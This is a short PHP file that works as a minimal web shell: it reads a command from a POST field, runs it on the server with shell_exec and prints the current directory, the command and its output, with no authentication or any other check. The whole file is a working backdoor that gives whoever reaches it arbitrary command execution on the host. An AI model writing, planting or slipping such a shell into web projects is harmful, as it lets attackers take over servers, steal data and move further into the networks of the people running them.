<?php
$command = $_POST['command'];
$output = shell_exec($command);
$dir = getcwd();
echo "$dir $command<pre>$output</pre>";
?>
